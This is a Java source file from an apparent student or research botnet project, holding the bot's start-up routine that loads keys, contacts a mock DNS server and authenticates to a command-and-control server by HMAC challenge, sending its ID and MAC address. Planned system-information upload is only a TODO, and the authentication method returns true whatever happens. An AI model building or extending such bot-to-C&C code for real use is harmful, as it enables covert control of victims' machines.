package cs.sii.bot.passive;

import java.io.IOException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.NoSuchProviderException;
import java.security.SignatureException;
import java.security.spec.InvalidKeySpecException;
import java.util.ArrayList;

import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;

import org.apache.commons.codec.binary.Base64;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

import cs.sii.bot.active.BotAuth;
import cs.sii.config.bot.Engine;
import cs.sii.domain.FileUtil;
import cs.sii.domain.Pairs;
import cs.sii.service.connection.AsyncRequest;
import cs.sii.service.connection.NetworkService;
import cs.sii.service.crypto.CryptoPKI;
import cs.sii.service.crypto.CryptoUtils;

@Service
public class BotInitialize {

	@Autowired
	private Engine engineBot;

	@Autowired
	private NetworkService networkService;

	@Autowired
	private AsyncRequest request;

	@Autowired
	private BotAuth auth;

	@Autowired
	private CryptoPKI pki;

	@Autowired
	private CryptoUtils cryptoUtils;

	public BotInitialize() {
	}

	public void initializeBot() throws IOException, NoSuchAlgorithmException, NoSuchProviderException, InvalidKeySpecException, InvalidKeyException, IllegalBlockSizeException, BadPaddingException, SignatureException {

//		ArrayList<String> param = new ArrayList<String>();
//		param = cryptoUtils.decodeStringsFromFile("");
		pki.readKeyFromFile();

		if (!engineBot.isCommandandconquerStatus()) {

			// metter controllo ID se ==NULL genera altrimenti riusa
			// TODO salvare ID su properties

			// inserire id univoco nella richiesta
			networkService.firstConnectToMockServerDns();
			// reinserire id univoco nella richiesta
			if (challengeToCommandConquer()) {
				// push info online os
				System.out.println("Bot is Ready");
			} else
				System.out.println("Bot not Ready, authentication failed");
		}
	}

	public void getInfo() {

		// TODO prendi info sistema

		// TODO pusha online info

	}

	private boolean challengeToCommandConquer() {
		//
		System.out.println("IP C&C "+networkService.getCommandConquerIps().getIPList().get(0));

		Pairs<Long, Integer> challenge = request.getChallengeFromCommandAndConquer(engineBot.getIdBot(),networkService.getCommandConquerIps().getIPList().get(0));

		if (challenge != null) {

			String key = auth.generateStringKey(challenge.getValue2());
			String hashMac = auth.generateHmac(challenge.getValue1(), auth.generateSecretKey(key));
			System.out.println(hashMac);
			String response = request.getResponseFromCommandAndConquer(engineBot.getIdBot(), networkService.getMac(),
					networkService.getCommandConquerIps().getIPList().get(0), hashMac);
			System.out.println("La risposta del CeC: " + response);

		}

		return true;
	}

}
